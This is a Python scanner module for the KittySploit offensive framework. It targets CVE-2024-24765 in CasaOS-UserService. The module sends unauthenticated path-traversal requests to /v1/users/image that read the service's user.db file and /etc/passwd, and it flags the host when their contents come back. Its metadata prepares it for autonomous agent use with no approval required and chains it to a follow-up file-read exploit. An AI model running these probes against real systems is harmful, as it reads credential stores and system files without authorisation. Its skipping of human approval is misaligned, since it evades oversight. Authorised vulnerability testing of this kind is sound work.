#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CasaOS-UserService arbitrary file read via /v1/users/image (CVE-2024-24765)."""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'CasaOS - Arbitrary File Read via users/image (CVE-2024-24765)',
        'description': (
            'CasaOS-UserService < 0.4.7 insufficiently filters the path parameter of '
            '/v1/users/image, allowing unauthenticated arbitrary file read '
            '(e.g. user.db /etc/passwd) — CVE-2024-24765.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'cve', 'cve2024', 'casaos', 'icewhale', 'lfi',
            'path-traversal', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'file_read', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'auxiliary/admin/http/casaos_cve_2024_24765_file_read',
                ],
            },
        },
        'references': [
            'https://github.com/IceWhaleTech/CasaOS-UserService/security/advisories/GHSA-h5gf-cmm8-cg7c',
            'https://nvd.nist.gov/vuln/detail/CVE-2024-24765',
        ],
        'cve': 'CVE-2024-24765',
    }

    def run(self):
        probes = (
            (
                '/v1/users/image?path=/var/lib/casaos/conf/../db/user.db',
                lambda b, raw: raw.startswith(b'SQLite format 3') or 'SQLite format 3' in b,
            ),
            (
                '/v1/users/image?path=/etc/passwd',
                lambda b, raw: bool(re.search(r'root:.*:0:0:', b)),
            ),
        )
        for path, matcher in probes:
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            raw = r.content or b''
            if matcher(body, raw):
                self.set_info(
                    severity='critical',
                    reason='CasaOS CVE-2024-24765 arbitrary file read via /v1/users/image',
                    path=path,
                )
                return True
        return False
